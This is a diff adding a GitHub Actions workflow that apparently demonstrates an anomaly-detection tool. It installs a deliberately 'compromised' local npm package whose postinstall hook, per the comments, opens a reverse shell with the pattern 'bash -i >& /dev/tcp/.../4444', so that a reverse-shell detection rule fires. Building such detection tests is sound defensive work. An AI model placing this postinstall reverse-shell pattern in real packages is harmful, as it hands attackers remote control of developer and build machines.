@@ -1,0 +1,42 @@
+name: attack-2-revshell
+# Demo goal: ANOMALY DETECTION.
+#
+# Simulated compromised npm dependency: a `postinstall` script runs after
+# `npm install` and spawns `bash -i >& /dev/tcp/.../4444` — the canonical
+# reverse-shell pattern. The detector's reverse_shell rule fires with
+# severity=critical (rule name: possible_reverse_shell) because a build-tool
+# ancestor (npm/node) spawned a shell that's making outbound TCP.
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: [self-hosted, linux, citadel-runner]
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Citadel
+        uses: ./action
+        with:
+          mode: audit
+          backend-url: http://localhost:8080
+          image-tag: dev
+          watch-path: ${{ github.workspace }}
+
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      # Install the "compromised" local package. npm runs its postinstall
+      # script automatically → that's where the reverse-shell fires from.
+      - name: Install compromised utility
+        run: |
+          citadel-step "npm install totally-legit-utility"
+          npm install --no-save ./examples/attacks/revshell
+
+      - name: Build
+        run: |
+          citadel-step "npm run build"
+          cd examples && npm run build
